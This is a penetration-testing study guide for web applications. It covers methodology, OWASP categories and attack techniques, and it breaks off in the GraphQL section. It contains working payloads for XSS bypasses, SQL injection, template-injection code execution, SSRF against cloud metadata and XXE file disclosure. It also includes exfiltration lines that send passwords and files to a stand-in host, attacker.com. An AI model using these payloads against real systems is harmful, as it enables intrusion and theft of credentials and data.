# Web-Application-Penetration-Testing

---

## 1. Foundational Architecture

### 1.1 Web Application Stack Analysis

```
┌─────────────────────────────────────────────────────────────┐
│                    CLIENT TIER                               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Browser Engine → DOM → JavaScript Runtime → WebAPIs│    │
│  └─────────────────────────────────────────────────────┘    │
├─────────────────────────────────────────────────────────────┤
│                    PRESENTATION TIER                         │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  CDN → Load Balancer → Reverse Proxy → Web Server   │    │
│  └─────────────────────────────────────────────────────┘    │
├─────────────────────────────────────────────────────────────┤
│                    APPLICATION TIER                          │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  App Server → Framework → Business Logic → APIs     │    │
│  └─────────────────────────────────────────────────────┘    │
├─────────────────────────────────────────────────────────────┤
│                    DATA TIER                                 │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Database → Cache → File Storage → Message Queue    │    │
│  └─────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 HTTP Protocol Deep Understanding

```
HTTP Request Anatomy:
┌────────────────────────────────────────────┐
│ METHOD /path?query=value HTTP/1.1          │ ← Request Line
├────────────────────────────────────────────┤
│ Host: target.com                           │
│ User-Agent: Mozilla/5.0...                 │
│ Cookie: session=abc123                     │ ← Headers
│ Content-Type: application/json             │
│ Authorization: Bearer eyJhbG...            │
├────────────────────────────────────────────┤
│ {"data": "payload"}                        │ ← Body
└────────────────────────────────────────────┘

Critical Headers for Penetration Testing:
─────────────────────────────────────────────
• Host           → Virtual host routing, host header attacks
• Origin         → CORS policy enforcement
• Referer        → CSRF protection, access control
• X-Forwarded-*  → Proxy chain manipulation
• Content-Type   → Parser selection, type confusion
• Authorization  → Authentication bypass vectors
```

### 1.3 State Management Theory

```
Session State Flow:
                                                    
  Client              Server              Storage
    │                    │                    │
    │──── Request ──────►│                    │
    │                    │◄── Session ID ─────│
    │◄─── Set-Cookie ────│                    │
    │                    │                    │
    │─── Cookie+Request─►│                    │
    │                    │── Validate ───────►│
    │                    │◄── Session Data ───│
    │◄─── Response ──────│                    │

Attack Surfaces:
• Session ID Generation (entropy analysis)
• Session Storage (hijacking vectors)
• Session Transmission (interception)
• Session Lifecycle (fixation, persistence)
```

---

## 2. Methodology Frameworks

### 2.1 PTES Web Application Methodology

```
Phase 1: Pre-engagement
├── Scope Definition
├── Rules of Engagement
├── Legal Authorization
└── Emergency Contacts

Phase 2: Intelligence Gathering
├── Passive Reconnaissance
│   ├── OSINT Collection
│   ├── DNS Enumeration
│   └── Technology Fingerprinting
└── Active Reconnaissance
    ├── Port Scanning
    ├── Service Enumeration
    └── Application Mapping

Phase 3: Threat Modeling
├── Entry Point Identification
├── Trust Boundary Mapping
├── Attack Surface Analysis
└── Threat Prioritization

Phase 4: Vulnerability Analysis
├── Automated Scanning
├── Manual Testing
├── Code Review (if available)
└── Configuration Analysis

Phase 5: Exploitation
├── Proof of Concept Development
├── Privilege Escalation
├── Lateral Movement
└── Data Exfiltration Testing

Phase 6: Post-Exploitation
├── Persistence Mechanisms
├── Evidence Collection
└── Cleanup

Phase 7: Reporting
├── Executive Summary
├── Technical Details
├── Risk Assessment
└── Remediation Guidance
```

### 2.2 OWASP Testing Framework Matrix

```
┌──────────────────┬────────────────────────────────────────┐
│ Category         │ Test Areas                              │
├──────────────────┼────────────────────────────────────────┤
│ INFO             │ Fingerprinting, App Discovery,         │
│                  │ App Entry Points, Map Execution Paths  │
├──────────────────┼────────────────────────────────────────┤
│ CONFIG           │ Network Config, Platform Config,       │
│                  │ File Extensions, Backup Files,         │
│                  │ Admin Interfaces, HTTP Methods         │
├──────────────────┼────────────────────────────────────────┤
│ IDENTITY         │ Role Definitions, Registration,        │
│                  │ Account Provisioning, Enumeration      │
├──────────────────┼────────────────────────────────────────┤
│ AUTHN            │ Credential Transport, Default Creds,   │
│                  │ Lockout, Bypass, Password Recovery,    │
│                  │ Remember Me, Browser Cache             │
├──────────────────┼────────────────────────────────────────┤
│ AUTHZ            │ Directory Traversal, Bypass,           │
│                  │ Privilege Escalation, IDOR             │
├──────────────────┼────────────────────────────────────────┤
│ SESSION          │ Session Management, Cookies,           │
│                  │ Fixation, Exposure, CSRF               │
├──────────────────┼────────────────────────────────────────┤
│ INPUT            │ XSS, Injection (SQL, Command, etc.),   │
│                  │ Format String, Overflow                │
├──────────────────┼────────────────────────────────────────┤
│ ERROR            │ Error Handling, Stack Traces           │
├──────────────────┼────────────────────────────────────────┤
│ CRYPTO           │ Weak SSL/TLS, Sensitive Data,          │
│                  │ Insufficient Transport Layer           │
├──────────────────┼────────────────────────────────────────┤
│ BUSINESS         │ Logic Flaws, File Upload,              │
│                  │ Payment Bypass, Workflow Bypass        │
├──────────────────┼────────────────────────────────────────┤
│ CLIENT           │ DOM XSS, JavaScript Execution,         │
│                  │ HTML Injection, Clickjacking           │
└──────────────────┴────────────────────────────────────────┘
```

---

## 3. Reconnaissance Theory

### 3.1 Passive Reconnaissance Techniques

```
OSINT Collection Framework:
━━━━━━━━━━━━━━━━━━━━━━━━━

Domain Intelligence:
├── WHOIS Records → Registrant info, name servers
├── DNS Records → A, AAAA, MX, TXT, CNAME, NS, SOA
├── Subdomain Discovery
│   ├── Certificate Transparency Logs
│   ├── DNS Brute Forcing
│   ├── Search Engine Dorking
│   └── Archive Services (Wayback)
└── ASN/IP Range Mapping

Technology Stack:
├── Wappalyzer Signatures
├── Response Header Analysis
├── JavaScript Library Detection
├── Cookie Naming Patterns
└── Error Page Fingerprinting

Content Discovery:
├── robots.txt, sitemap.xml
├── Source Code Comments
├── Hidden Form Fields
├── API Endpoint Documentation
└── Client-Side Storage Analysis
```

### 3.2 Active Reconnaissance

```
Application Mapping Process:
━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Spider/Crawl
   └── Discover all accessible endpoints
   
2. Directory/File Bruteforcing
   └── Find hidden resources
   
3. Parameter Discovery
   └── Identify input vectors
   
4. API Enumeration
   └── Map API structure and methods

Entry Point Classification:
┌─────────────────────────────────────────────────────────┐
│ Type              │ Examples                            │
├───────────────────┼─────────────────────────────────────┤
│ URL Parameters    │ ?id=1&action=view                   │
│ POST Body         │ username=admin&password=xxx         │
│ URL Path          │ /user/123/profile                   │
│ HTTP Headers      │ Cookie, Authorization, X-Custom     │
│ File Uploads      │ Images, documents, archives         │
│ WebSocket         │ ws:// connections, message frames   │
│ Fragment          │ #section (client-side routing)      │
└───────────────────┴─────────────────────────────────────┘
```

### 3.3 Fingerprinting Theory

```
Technology Detection Methods:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HTTP Response Analysis:
┌────────────────────────────────────────────────────────┐
│ Server: Apache/2.4.41 (Ubuntu)                         │
│ X-Powered-By: PHP/7.4.3                                │
│ X-AspNet-Version: 4.0.30319                            │
│ Set-Cookie: JSESSIONID=xxx → Java application          │
│ Set-Cookie: PHPSESSID=xxx → PHP application            │
│ Set-Cookie: ASP.NET_SessionId=xxx → .NET application   │
└────────────────────────────────────────────────────────┘

Framework Fingerprints:
├── Laravel → /vendor/, XSRF-TOKEN cookie
├── Django → csrfmiddlewaretoken, /admin/
├── Rails → _session_id, /rails/info
├── Spring → JSESSIONID, /actuator/
└── WordPress → /wp-admin/, /wp-content/

Error Page Analysis:
├── Stack traces reveal framework
├── Default error pages
├── Error message patterns
└── Debug mode indicators
```

---

## 4. Vulnerability Classes Deep Dive

### 4.1 OWASP Top 10 2021 Technical Analysis

```
A01: Broken Access Control
━━━━━━━━━━━━━━━━━━━━━━━━━
Theory: Failure to enforce proper authorization

Attack Patterns:
├── Vertical Privilege Escalation
│   └── User → Admin functionality access
├── Horizontal Privilege Escalation  
│   └── User A → User B data access
├── IDOR (Insecure Direct Object Reference)
│   └── Manipulating resource identifiers
└── Forced Browsing
    └── Accessing unlinked resources

Testing Methodology:
1. Map role-based access requirements
2. Test each function with different privilege levels
3. Modify identifiers in requests
4. Bypass access controls via:
   • URL manipulation
   • Parameter tampering
   • Header injection
   • Method switching (GET↔POST)

Example Vulnerable Pattern:
┌────────────────────────────────────────────┐
│ GET /api/users/1234/data                   │
│ Authorization: Bearer [user_token]         │
│                                            │
│ // Change 1234 to 1235 (another user)      │
│ // If data returned → IDOR vulnerability   │
└────────────────────────────────────────────┘
```

```
A02: Cryptographic Failures
━━━━━━━━━━━━━━━━━━━━━━━━━━
Theory: Improper protection of sensitive data

Vulnerability Areas:
├── Data in Transit
│   ├── Missing TLS/HTTPS
│   ├── Weak cipher suites
│   ├── Certificate issues
│   └── Mixed content
├── Data at Rest
│   ├── Unencrypted storage
│   ├── Weak encryption algorithms
│   ├── Improper key management
│   └── Hardcoded secrets
└── Data Processing
    ├── Cleartext logging
    ├── Client-side storage
    └── Memory exposure

Testing Focus:
• SSL/TLS configuration analysis
• Sensitive data flow tracing
• Password storage mechanisms
• Key generation and rotation
• Entropy analysis
```

```
A03: Injection
━━━━━━━━━━━━━━
Theory: Untrusted data sent to interpreter as command/query

Injection Types:
┌────────────────┬─────────────────────────────────────────┐
│ Type           │ Interpreter/Context                     │
├────────────────┼─────────────────────────────────────────┤
│ SQL            │ Database query processor                │
│ NoSQL          │ MongoDB, CouchDB query parser           │
│ OS Command     │ System shell (bash, cmd)                │
│ LDAP           │ Directory service query                 │
│ XPath          │ XML query language                      │
│ Template       │ Server-side template engines            │
│ Expression     │ SpEL, OGNL, EL                          │
│ Header         │ CRLF injection in HTTP headers          │
└────────────────┴─────────────────────────────────────────┘

Injection Conditions:
1. User input reaches interpreter
2. Input not properly sanitized/validated
3. Context boundaries not maintained
4. Parameterization not implemented
```

### 4.2 Cross-Site Scripting (XSS) Deep Theory

```
XSS Classification System:
━━━━━━━━━━━━━━━━━━━━━━━━━

1. REFLECTED XSS
   ├── Input → Server → Response → Execution
   ├── Non-persistent
   ├── Requires user interaction (click link)
   └── Often in search, error messages, redirects

2. STORED XSS
   ├── Input → Server → Database → Future Responses
   ├── Persistent
   ├── Affects all users viewing content
   └── Found in comments, profiles, messages

3. DOM-BASED XSS
   ├── Input → Client-Side JavaScript → DOM Modification
   ├── Never touches server
   ├── Triggered by fragment (#) or client-side sources
   └── Sources: location.*, document.URL, document.referrer

XSS Sink/Source Theory:
┌─────────────────────────────────────────────────────────┐
│ SOURCES (Where data enters)                             │
├─────────────────────────────────────────────────────────┤
│ location.href, location.search, location.hash           │
│ document.URL, document.referrer, document.cookie        │
│ window.name, postMessage data                           │
│ localStorage, sessionStorage                            │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│ SINKS (Where data executes)                             │
├─────────────────────────────────────────────────────────┤
│ innerHTML, outerHTML, document.write()                  │
│ eval(), setTimeout(), setInterval()                     │
│ Function(), new Function()                              │
│ element.src, element.href, location.href                │
│ jQuery: html(), append(), after(), before()             │
└─────────────────────────────────────────────────────────┘
```

```
XSS Context Analysis:
━━━━━━━━━━━━━━━━━━━━━

Context 1: HTML Body
Input:  <div>USER_INPUT</div>
Payload: <script>alert(1)</script>
         <img src=x onerror=alert(1)>

Context 2: HTML Attribute
Input:  <input value="USER_INPUT">
Payload: " onfocus="alert(1)" autofocus="
         " onmouseover="alert(1)

Context 3: JavaScript String
Input:  <script>var x = 'USER_INPUT';</script>
Payload: ';alert(1);//
         </script><script>alert(1)</script>

Context 4: URL Parameter
Input:  <a href="USER_INPUT">
Payload: javascript:alert(1)
         data:text/html,<script>alert(1)</script>

Context 5: CSS Context
Input:  <style>USER_INPUT</style>
Payload: body{background:url('javascript:alert(1)')}
         </style><script>alert(1)</script>

Context 6: Inside JavaScript Event
Input:  <div onclick="func('USER_INPUT')">
Payload: ');alert(1);//
```

```
XSS Filter Bypass Techniques:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Encoding Bypasses:
├── HTML Entity: &lt;script&gt; → <script>
├── Unicode: \u003cscript\u003e
├── URL Encoding: %3Cscript%3E
├── Double Encoding: %253Cscript%253E
├── Mixed Case: <ScRiPt>
└── Null Bytes: <scr%00ipt>

Tag Alternatives:
├── <svg onload=alert(1)>
├── <body onpageshow=alert(1)>
├── <marquee onstart=alert(1)>
├── <video><source onerror=alert(1)>
├── <details open ontoggle=alert(1)>
└── <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

JavaScript Without Parentheses:
├── onerror=alert`1`
├── onfocus=alert&lpar;1&rpar;
├── onclick=alert?.()
└── throw onerror=alert,1
```

### 4.3 SQL Injection Advanced Theory

```
SQL Injection Types:
━━━━━━━━━━━━━━━━━━━

1. IN-BAND SQLi (Results visible in response)
   ├── Union-based: Combine results with malicious query
   └── Error-based: Extract data via error messages

2. BLIND SQLi (No direct output)
   ├── Boolean-based: True/false response differences
   ├── Time-based: Response delay indicates true/false
   └── Out-of-band: DNS/HTTP requests exfiltrate data

3. SECOND-ORDER SQLi
   └── Payload stored, executed later in different context

Union-Based Exploitation Flow:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Step 1: Determine column count
        ORDER BY 1-- ✓
        ORDER BY 2-- ✓
        ORDER BY 3-- ✓
        ORDER BY 4-- ✗ → 3 columns

Step 2: Find display columns
        UNION SELECT 'a','b','c'--
        
Step 3: Extract data
        UNION SELECT username,password,null FROM users--

Database-Specific Syntax:
┌──────────────┬─────────────────────────────────────────┐
│ Database     │ Specific Techniques                     │
├──────────────┼─────────────────────────────────────────┤
│ MySQL        │ INFORMATION_SCHEMA, LOAD_FILE(),        │
│              │ INTO OUTFILE, @@version                 │
├──────────────┼─────────────────────────────────────────┤
│ PostgreSQL   │ pg_catalog, COPY, version(),            │
│              │ string_agg()                            │
├──────────────┼─────────────────────────────────────────┤
│ MSSQL        │ sysobjects, xp_cmdshell, OPENROWSET,   │
│              │ @@version                               │
├──────────────┼─────────────────────────────────────────┤
│ Oracle       │ ALL_TABLES, UTL_HTTP, DBMS_PIPE        │
├──────────────┼─────────────────────────────────────────┤
│ SQLite       │ sqlite_master, sqlite_version()         │
└──────────────┴─────────────────────────────────────────┘
```

```
Blind SQL Injection Theory:
━━━━━━━━━━━━━━━━━━━━━━━━━━

Boolean-Based Logic:
┌────────────────────────────────────────────────────────┐
│ Original: SELECT * FROM users WHERE id = '1'           │
│                                                        │
│ Test True:  1' AND '1'='1  → Normal response           │
│ Test False: 1' AND '1'='2  → Different response        │
│                                                        │
│ Extract data character by character:                   │
│ 1' AND SUBSTRING(password,1,1)='a'-- (iterate a-z)    │
│ 1' AND ASCII(SUBSTRING(password,1,1))>97--            │
└────────────────────────────────────────────────────────┘

Time-Based Logic:
┌────────────────────────────────────────────────────────┐
│ MySQL:  1' AND SLEEP(5)--                              │
│ MSSQL:  1'; WAITFOR DELAY '0:0:5'--                    │
│ Oracle: 1' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)--     │
│ PgSQL:  1'; SELECT pg_sleep(5)--                       │
│                                                        │
│ Conditional:                                           │
│ 1' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--   │
└────────────────────────────────────────────────────────┘

Out-of-Band (OOB) Extraction:
┌────────────────────────────────────────────────────────┐
│ DNS Exfiltration:                                      │
│ LOAD_FILE(CONCAT('\\\\',                               │
│   (SELECT password FROM users LIMIT 1),                │
│   '.attacker.com\\a'))                                 │
│                                                        │
│ HTTP Exfiltration (Oracle):                            │
│ SELECT UTL_HTTP.REQUEST('http://attacker.com/'||       │
│   (SELECT password FROM users WHERE rownum=1))         │
│   FROM dual                                            │
└────────────────────────────────────────────────────────┘
```

---

## 5. Authentication & Session Attacks

### 5.1 Authentication Vulnerability Theory

```
Authentication Attack Taxonomy:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. CREDENTIAL ATTACKS
   ├── Brute Force
   │   ├── Simple brute force (all combinations)
   │   ├── Dictionary attacks
   │   ├── Credential stuffing (leaked creds)
   │   └── Password spraying (one password, many users)
   ├── Default Credentials
   └── Credential Recovery Flaws

2. BYPASS ATTACKS
   ├── SQL Injection in login
   │   └── ' OR '1'='1'-- 
   ├── Type Juggling (PHP)
   │   └── password[]=  (array comparison)
   ├── Parameter Manipulation
   │   └── Removing password parameter
   ├── Response Manipulation
   │   └── Changing "false" to "true" in response
   └── Race Conditions
       └── Simultaneous requests

3. MFA BYPASS
   ├── Direct endpoint access (skip MFA page)
   ├── Brute force OTP
   ├── OTP reuse
   ├── Response manipulation
   └── Backup code exposure

Password Reset Vulnerabilities:
┌─────────────────────────────────────────────────────────┐
│ • Predictable reset tokens (weak entropy)               │
│ • Token not invalidated after use                       │
│ • Token exposed in referrer header                      │
│ • Host header injection in reset email                  │
│ • Password reset poisoning                              │
│ • Lack of rate limiting                                 │
│ • Account lockout not applied                           │
└─────────────────────────────────────────────────────────┘
```

### 5.2 Session Management Theory

```
Session Security Analysis:
━━━━━━━━━━━━━━━━━━━━━━━━━

Session ID Security Requirements:
├── Entropy: Minimum 128 bits of randomness
├── Length: Long enough to prevent brute force
├── Uniqueness: No collisions
└── Unpredictability: Cryptographically random

Session ID Attacks:
┌───────────────────────────────────────────────────────┐
│ ATTACK              │ DESCRIPTION                     │
├─────────────────────┼─────────────────────────────────│
│ Session Fixation    │ Attacker sets victim's session  │
│                     │ ID before authentication        │
├─────────────────────┼─────────────────────────────────│
│ Session Hijacking   │ Stealing active session via     │
│                     │ XSS, MITM, or network sniffing  │
├─────────────────────┼─────────────────────────────────│
│ Session Prediction  │ Guessing valid session IDs      │
│                     │ due to weak generation          │
├─────────────────────┼─────────────────────────────────│
│ Session Donation    │ Attacker gives own session      │
│                     │ to victim (for phishing)        │
└─────────────────────┴─────────────────────────────────┘

Cookie Security Attributes:
┌──────────────────────────────────────────────────────────┐
│ Set-Cookie: session=abc123;                              │
│   Secure;        → Only HTTPS transmission               │
│   HttpOnly;      → No JavaScript access                  │
│   SameSite=Strict; → No cross-site sending               │
│   Path=/app;     → Scope limitation                      │
│   Domain=.site.com; → Domain scope                       │
│   Max-Age=3600   → Expiration                            │
└──────────────────────────────────────────────────────────┘
```

### 5.3 JWT Security Theory

```
JWT Structure Analysis:
━━━━━━━━━━━━━━━━━━━━━

Header.Payload.Signature
   │       │        │
   │       │        └── HMAC/RSA verification
   │       └── Claims (user data)
   └── Algorithm specification

JWT Attack Vectors:
┌──────────────────────────────────────────────────────────┐
│ 1. ALGORITHM CONFUSION                                   │
│    Header: {"alg": "none"}                               │
│    → Signature verification bypassed                     │
│                                                          │
│ 2. RS256 to HS256 DOWNGRADE                              │
│    Original: RS256 (asymmetric)                          │
│    Attack: HS256 with public key as secret               │
│    → Forge valid signatures using public key             │
│                                                          │
│ 3. WEAK SECRET                                           │
│    HS256 with guessable/brute-forceable secret           │
│    Tools: jwt_tool, hashcat                              │
│                                                          │
│ 4. KID INJECTION                                         │
│    {"kid": "../../etc/passwd"}                           │
│    {"kid": "key' UNION SELECT 'secret'--"}               │
│                                                          │
│ 5. JWK HEADER INJECTION                                  │
│    Embed attacker's key in token header                  │
│                                                          │
│ 6. CLAIM TAMPERING                                       │
│    Modify sub, role, exp claims if signature unchecked   │
└──────────────────────────────────────────────────────────┘

JWT Testing Checklist:
□ Test "alg": "none" (with variations: None, NONE, nOnE)
□ Test algorithm confusion (RS256→HS256)
□ Brute force HS256 secrets
□ Modify claims without signature
□ Test expired tokens
□ Test kid parameter injection
□ Check for sensitive data in payload
□ Verify signature validation enforcement
```

---

## 6. Advanced Injection Techniques

### 6.1 Server-Side Template Injection (SSTI)

```
SSTI Theory:
━━━━━━━━━━━━

Template engines render dynamic content by evaluating
expressions within templates. SSTI occurs when user
input is embedded directly into template code.

Detection Methodology:
┌─────────────────────────────────────────────────────────┐
│ Test String: ${{<%[%'"}}%\                              │
│                                                          │
│ Template-Specific Probes:                                │
│ ├── {{7*7}}        → Jinja2, Twig, Nunjucks             │
│ ├── ${7*7}         → Freemarker, Velocity               │
│ ├── #{7*7}         → Thymeleaf, Ruby ERB                │
│ ├── *{7*7}         → Thymeleaf                          │
│ ├── <%= 7*7 %>     → ERB, EJS                           │
│ └── ${{7*7}}       → AngularJS (client-side)            │
│                                                          │
│ If 49 appears → Template expression evaluated           │
└─────────────────────────────────────────────────────────┘

Template Engine Exploitation:
┌──────────────────┬────────────────────────────────────────┐
│ Engine           │ RCE Payload                            │
├──────────────────┼────────────────────────────────────────┤
│ Jinja2 (Python)  │ {{config.__class__.__init__.__globals__│
│                  │ ['os'].popen('id').read()}}            │
├──────────────────┼────────────────────────────────────────┤
│ Twig (PHP)       │ {{_self.env.registerUndefined          │
│                  │ FilterCallback("exec")}}{{_self.env.   │
│                  │ getFilter("id")}}                      │
├──────────────────┼────────────────────────────────────────┤
│ Freemarker(Java) │ ${"freemarker.template.utility.Execute"│
│                  │ ?new()("id")}                          │
├──────────────────┼────────────────────────────────────────┤
│ Velocity (Java)  │ #set($e="e")$e.getClass().forName      │
│                  │ ("java.lang.Runtime").getMethod...     │
├──────────────────┼────────────────────────────────────────┤
│ Pebble (Java)    │ {% set cmd = 'id' %}                   │
│                  │ {% set bytes = (1).TYPE.forName('java. │
│                  │ lang.Runtime').methods[6].invoke...%}  │
└──────────────────┴────────────────────────────────────────┘
```

### 6.2 Server-Side Request Forgery (SSRF)

```
SSRF Attack Theory:
━━━━━━━━━━━━━━━━━━

SSRF exploits server's ability to make HTTP requests,
allowing attacker to:
• Access internal services
• Bypass firewall restrictions  
• Read local files
• Pivot to internal network

SSRF Exploitation Targets:
┌─────────────────────────────────────────────────────────┐
│ 1. CLOUD METADATA SERVICES                              │
│    AWS:   http://169.254.169.254/latest/meta-data/      │
│    GCP:   http://metadata.google.internal/              │
│    Azure: http://169.254.169.254/metadata/instance      │
│    → Retrieve IAM credentials, instance data            │
│                                                          │
│ 2. INTERNAL SERVICES                                    │
│    http://localhost:8080/admin                          │
│    http://192.168.1.1/                                  │
│    http://internal-api.local/                           │
│                                                          │
│ 3. LOCAL FILE ACCESS                                    │
│    file:///etc/passwd                                   │
│    file:///C:/Windows/System32/config/SAM              │
│                                                          │
│ 4. PROTOCOL EXPLOITATION                                │
│    gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0a... (Redis) │
│    dict://127.0.0.1:6379/info                           │
└─────────────────────────────────────────────────────────┘

SSRF Bypass Techniques:
├── IP Address Formats
│   ├── Decimal: http://2130706433 (127.0.0.1)
│   ├── Octal: http://0177.0.0.1
│   ├── Hex: http://0x7f.0x0.0x0.0x1
│   ├── IPv6: http://[::1]/, http://[::ffff:127.0.0.1]
│   └── Mixed: http://127.1, http://0
├── DNS Rebinding
│   └── Domain resolves to internal IP
├── Redirect Bypass
│   └── External URL redirects to internal
├── URL Parsing Discrepancies
│   └── http://evil.com#@internal.com
│   └── http://internal.com@evil.com
└── Protocol Smuggling
    └── Different protocols for filter bypass
```

### 6.3 XML External Entity (XXE)

```
XXE Attack Theory:
━━━━━━━━━━━━━━━━━

XXE exploits XML parsers that process external 
entity definitions, allowing file disclosure,
SSRF, and potentially RCE.

XXE Payload Types:
┌─────────────────────────────────────────────────────────┐
│ 1. BASIC FILE DISCLOSURE                                │
│ <?xml version="1.0"?>                                   │
│ <!DOCTYPE foo [                                         │
│   <!ENTITY xxe SYSTEM "file:///etc/passwd">             │
│ ]>                                                       │
│ <data>&xxe;</data>                                       │
│                                                          │
│ 2. SSRF VIA XXE                                         │
│ <!DOCTYPE foo [                                         │
│   <!ENTITY xxe SYSTEM "http://internal-api/secret">     │
│ ]>                                                       │
│                                                          │
│ 3. BLIND XXE (OOB Data Exfiltration)                    │
│ <!DOCTYPE foo [                                         │
│   <!ENTITY % file SYSTEM "file:///etc/passwd">          │
│   <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> │
│   %dtd;                                                  │
│ ]>                                                       │
│                                                          │
│ evil.dtd:                                                │
│ <!ENTITY % all "<!ENTITY send SYSTEM               │
│   'http://attacker.com/?data=%file;'>">                 │
│ %all;                                                    │
│                                                          │
│ 4. ERROR-BASED XXE                                      │
│ <!ENTITY % file SYSTEM "file:///etc/passwd">            │
│ <!ENTITY % error "<!ENTITY % test SYSTEM               │
│   'file:///nonexistent/%file;'>">                       │
│ %error; %test;                                           │
└─────────────────────────────────────────────────────────┘

XXE in Different Contexts:
├── SVG files (image upload)
├── DOCX, XLSX, PPTX (Office documents)
├── PDF generation
├── SOAP web services
├── RSS/Atom feeds
└── SAML assertions
```

---

## 7. Business Logic Vulnerabilities

### 7.1 Business Logic Flaw Theory

```
Business Logic Vulnerability Categories:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Unlike technical flaws, business logic vulnerabilities
exploit flawed assumptions in application design.

1. WORKFLOW BYPASS
   ├── Skipping required steps
   ├── Repeating steps inappropriately
   ├── Performing steps out of order
   └── Missing state validation

2. ABUSE OF FUNCTIONALITY
   ├── Using features beyond intended purpose
   ├── Exploiting trust relationships
   └── Feature interaction exploitation

3. INSUFFICIENT VALIDATION
   ├── Negative value handling
   ├── Boundary condition failures
   ├── Type confusion
   └── Missing server-side validation

Testing Methodology:
┌─────────────────────────────────────────────────────────┐
│ Step 1: Understand Business Rules                       │
│ • Map complete workflow                                 │
│ • Identify business constraints                         │
│ • Document expected behaviors                           │
│                                                          │
│ Step 2: Challenge Assumptions                           │
│ • What if values are negative?                          │
│ • What if steps are skipped?                            │
│ • What if requests are replayed?                        │
│ • What if concurrent requests occur?                    │
│                                                          │
│ Step 3: Test Edge Cases                                 │
│ • Maximum/minimum values                                │
│ • Empty/null inputs                                     │
│ • Special characters                                    │
│ • Race conditions                                       │
└─────────────────────────────────────────────────────────┘
```

### 7.2 Common Business Logic Flaws

```
E-Commerce Logic Flaws:
━━━━━━━━━━━━━━━━━━━━━━

1. PRICE MANIPULATION
   ├── Negative quantity → negative total
   ├── Modifying hidden price fields
   ├── Currency confusion
   └── Discount stacking

2. COUPON/DISCOUNT ABUSE
   ├── Applying coupons multiple times
   ├── Race condition on single-use coupons
   ├── Coupon code enumeration
   └── Transferring coupons between accounts

3. PAYMENT BYPASS
   ├── Modifying order amount after validation
   ├── Skipping payment step
   ├── Callback manipulation
   └── Race condition: place order while payment pending

4. INVENTORY MANIPULATION
   ├── Purchasing more than available stock
   ├── Holding items indefinitely in cart
   └── Cancellation loop for free goods

Example Attack Flow:
┌─────────────────────────────────────────────────────────┐
│ Normal Flow:                                            │
│ Add item($100) → Checkout → Pay $100 → Confirm          │
│                                                          │
│ Attack Flow:                                            │
│ Add item($100) → Add item($-100) → Checkout → Pay $0    │
│                                                          │
│ OR:                                                      │
│ Add item → Checkout → [Intercept] → Modify price to $0  │
│          → Forward → Complete order                      │
└─────────────────────────────────────────────────────────┘
```

### 7.3 Race Condition Theory

```
Race Condition Fundamentals:
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Race conditions occur when application behavior depends
on sequence/timing of uncontrollable events.

Time-of-Check to Time-of-Use (TOCTOU):
┌─────────────────────────────────────────────────────────┐
│                                                          │
│ Thread 1:     CHECK      ────────────►     USE          │
│               balance≥$100               deduct $100    │
│                    │                          │          │
│ Thread 2:          │     CHECK               │          │
│                    │     balance≥$100        │          │
│                    └──────►  │    USE ◄──────┘          │
│                              │    deduct $100            │
│                              ▼                           │
│               Both checks pass, but total deduction     │
│               exceeds actual balance!                    │
│                                                          │
└─────────────────────────────────────────────────────────┘

Exploitable Scenarios:
├── Coupon/gift card redemption
├── Funds transfer
├── Vote/rating manipulation
├── Following/unfollowing
├── Limit bypass (rate limits, quantity limits)
└── Bonus/reward claiming

Testing Technique:
1. Identify state-changing operations
2. Send parallel requests (10-100 concurrent)
3. Analyze results for inconsistencies
4. Tools: Burp Turbo Intruder, race-the-web
```

---

## 8. API Security Testing

### 8.1 API Attack Surface

```
API Security Considerations:
━━━━━━━━━━━━━━━━━━━━━━━━━━━

OWASP API Security Top 10 (2023):
┌────────────────────────────────────────────────────────┐
│ API1: Broken Object Level Authorization                │
│ API2: Broken Authentication                            │
│ API3: Broken Object Property Level Authorization       │
│ API4: Unrestricted Resource Consumption                │
│ API5: Broken Function Level Authorization              │
│ API6: Unrestricted Access to Sensitive Business Flows  │
│ API7: Server Side Request Forgery                      │
│ API8: Security Misconfiguration                        │
│ API9: Improper Inventory Management                    │
│ API10: Unsafe Consumption of APIs                      │
└────────────────────────────────────────────────────────┘

API Enumeration:
├── Documentation discovery (/swagger, /api-docs, /openapi.json)
├── Endpoint discovery via JS files
├── Method enumeration (GET, POST, PUT, DELETE, PATCH)
├── Version discovery (/v1/, /v2/, api versioning headers)
└── Parameter discovery (fuzzing, documentation)
```

### 8.2 REST API Testing

```
REST API Attack Patterns:
━━━━━━━━━━━━━━━━━━━━━━━━

1. BOLA/IDOR Testing:
   GET /api/v1/users/123/data → GET /api/v1/users/124/data
   
   Object ID patterns:
   ├── Sequential integers (123, 124, 125)
   ├── UUIDs (may be predictable if not v4)
   ├── Encoded values (base64, hex)
   └── Composite IDs (user_123_order_456)

2. Mass Assignment:
   Normal: POST /api/users {"name": "test", "email": "t@t.com"}
   Attack: POST /api/users {"name": "test", "role": "admin"}
   
   Look for:
   ├── isAdmin, role, permissions
   ├── verified, active, approved
   ├── credit_balance, subscription_tier
   └── created_at, id (read-only fields)

3. HTTP Method Override:
   ├── X-HTTP-Method-Override: DELETE
   ├── X-Method-Override: PUT
   └── _method=PATCH (body parameter)

4. Content-Type Attacks:
   Supported: application/json
   Try: 
   ├── application/xml (XXE potential)
   ├── application/x-www-form-urlencoded
   └── multipart/form-data
```

### 8.3 GraphQL Security

```
GraphQL-Specific Attacks:
━━━━━━━━━━━━━━━━━━━━━━━━

1. INTROSPECTION QUERY
   Query entire schema:
   {__schema{types{name,fields{name,type{name}}}}}
   
   Discover:
   ├── All types and fields
   ├── Queries and mutations
